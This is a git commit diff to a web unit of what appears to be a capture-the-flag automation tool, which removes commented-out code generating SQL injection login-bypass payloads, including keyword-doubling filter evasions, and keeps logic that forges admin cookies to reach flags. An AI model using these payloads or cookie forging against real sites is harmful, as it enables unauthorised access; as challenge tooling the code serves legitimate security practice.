080ed14179d9fd1525580bdc30e64dc6cf1810d3
John Hammond <johnhammond010@gmail.com>
2019-04-17 23:01:21 -0400

    Removed useless code in web.logon_cookies

--- units/web/logon_cookies.py
+++ units/web/logon_cookies.py
@@ -25,6 +25,8 @@ pass_regex = "<\s*input.*name\s*=\s*['\"](%s)['\"]" % "|".join(potential_passwor
 
 potential_cookie_names = [ 'admin', 'is_admin', 'isadmin', 'administrator', 'isAdmin' ]
 
+
+
 class Unit(units.web.WebUnit):
 
 	def __init__(self, katana, parent, target):
@@ -49,67 +51,8 @@ class Unit(units.web.WebUnit):
 		if not (self.action and self.method and self.username and self.password):
 			raise NotApplicable
 
-	# def enumerate(self, katana):
-		
-	# 	# This should "yield 'name', (params,to,pass,to,evaluate)"
-	# 	# evaluate will see this second argument as only one variable and you will need to parse them out
-		
-	# 	try:
-	# 		r = requests.get(self.target)
-	# 	except requests.exceptions.ConnectionError:
-	# 		return
-
-	# 	action = re.findall(r"<\s*form.*action\s*=\s*('|\")(.+?)('|\")", r.text, flags=re.IGNORECASE)
-	# 	method = re.findall(r"<\s*form.*method\s*=\s*('|\")(.+?)('|\")", r.text, flags=re.IGNORECASE)
-
-	# 	potential_username_variables = [
-	# 		'username', 'user', 'uname', 'un', 'name', 'user1', 'input1', 'uw1', 'username1', 'uname1', 'tbUsername', 'usern', 'id'
-	# 	]
-	# 	potential_password_variables = [
-	# 		'password', 'pass', 'pword', 'pw', 'pass1', 'input2', 'password1', 'pw1', 'pword1', 'tbPassword'
-	# 	]
-
-	# 	user_regex = "<\s*input.*name\s*=\s*('|\")(%s)('|\")" % "|".join(potential_username_variables)
-	# 	pass_regex = "<\s*input.*name\s*=\s*('|\")(%s)('|\")" % "|".join(potential_password_variables)
-
-	# 	username = re.findall(user_regex, r.text, flags=re.IGNORECASE)
-	# 	password = re.findall(pass_regex, r.text, flags=re.IGNORECASE)
-
-	# 	if action and method and username and password:
-	# 		if action: action = action[0][1]
-	# 		if method: method = method[0][1]
-	# 		if username: username = username[0][1]
-	# 		if password: password = password[0][1]
-
-	# 		try:
-	# 			method = vars(requests)[method.lower()]
-	# 		except IndexError:
-	# 			log.warning("Could not find an appropriate HTTP method... defaulting to POST!")
-	# 			method = requests.post
-
-	# 		quotes_possibilities = [ "'", '"' ]
-	# 		comment_possibilities = [ "--", '#', '/*', '%00' ]
-	# 		delimeter_possibilities = [ ' ', '/**/' ]
-	# 		test_possibilities = [ 'OR', 'OORR', 'UNION SELECT', 'UNUNIONION SELSELECTECT' ]
-
-	# 		payloads = []
-	# 		count_attempt = 0
-	# 		for quote in quotes_possibilities:
-	# 			for comment in comment_possibilities:
-	# 				for delimeter in delimeter_possibilities:
-	# 					for test in test_possibilities:
-
-	# 						payload = quote + delimeter + test.replace(' ' ,delimeter) + delimeter + '1' + delimeter + comment
-	# 						count_attempt += 1
-	# 						yield (method, action, username, password, payload)
-
-	# 	else:
-	# 		return # This will tell THE WHOLE UNIT to stop... it will no longer generate cases.
-
-
 	def evaluate(self, katana, case):
-		# Split up the target (see get_cases)
-		# method, action, username, password, payload = case
+		
 		if self.action and self.method and self.username and self.password:
 			if self.action: action = self.action[0]
 			if self.method: method = self.method[0]
@@ -134,6 +77,3 @@ class Unit(units.web.WebUnit):
 						else:
 							new = requests.get(r.url, cookies = { admin_cookie : '1' })
 							if katana.locate_flags(self, new.text): break
-
-		
-		return None
